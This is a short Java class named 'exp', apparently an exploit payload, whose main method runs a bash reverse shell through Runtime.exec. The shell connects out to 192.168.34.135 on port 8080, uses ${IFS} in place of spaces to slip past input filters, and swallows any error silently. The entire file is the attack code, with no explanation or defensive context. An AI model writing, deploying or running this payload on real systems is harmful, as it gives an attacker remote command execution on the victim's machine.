import java.lang.Runtime;
import java.lang.Process;

public class exp {
    public static void main(String[] args) {
        	try {
            	Runtime rt = Runtime.getRuntime();
            	String commands = "/bin/bash -c bash${IFS}-i${IFS}>&/dev/tcp/192.168.34.135/8080<&1";
            	Process pc = rt.exec(commands);
            	pc.waitFor();
        	} catch (Exception e) {
            // do nothing
       }
    }
}